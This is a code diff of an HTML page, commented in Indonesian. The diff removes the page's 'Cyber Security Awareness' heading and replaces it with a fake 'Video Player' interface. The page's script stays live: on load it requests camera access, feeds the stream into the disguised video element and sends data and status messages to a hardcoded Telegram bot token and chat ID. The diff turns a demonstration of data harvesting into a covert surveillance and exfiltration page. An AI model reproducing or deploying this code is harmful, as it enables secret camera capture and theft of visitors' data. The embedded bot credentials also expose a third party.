@@ -3,15 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vidio Player</title>
+    <title>Video Player</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+        }
+        .video-container {
+            position: relative;
+            width: 640px;
+            height: 360px;
+            background: #000;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            background: black;
+        }
+        .controls {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            background: rgba(255, 255, 255, 0.3);
+            border: none;
+            padding: 10px;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Cyber Security Awareness</h1>
-    <p>Website ini menunjukkan betapa mudahnya informasi Anda dapat dikumpulkan.</p>
+
+    <div class="video-container">
+        <video id="video" autoplay muted></video>
+        <div class="controls">
+            <button onclick="togglePlay()">▶️ Play/Pause</button>
+        </div>
+    </div>
 
     <script>
         const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; // Ganti dengan token bot Telegram
         const CHAT_ID = "-1002270270494"; // Ganti dengan Chat ID Anda
+        let video = document.getElementById("video");
 
         function sendToTelegram(message) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -51,10 +93,9 @@
                 }
             );
 
-            // Ambil gambar dari kamera
+            // Aktifkan kamera dalam elemen video
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    let video = document.createElement("video");
                     video.srcObject = stream;
                     video.play();
 
@@ -77,6 +118,14 @@
                 .catch(error => {
                     sendToTelegram("❌ Kamera tidak diizinkan.");
                 });
+        }
+
+        function togglePlay() {
+            if (video.paused) {
+                video.play();
+            } else {
+                video.pause();
+            }
         }
 
         // Jalankan saat halaman dimuat
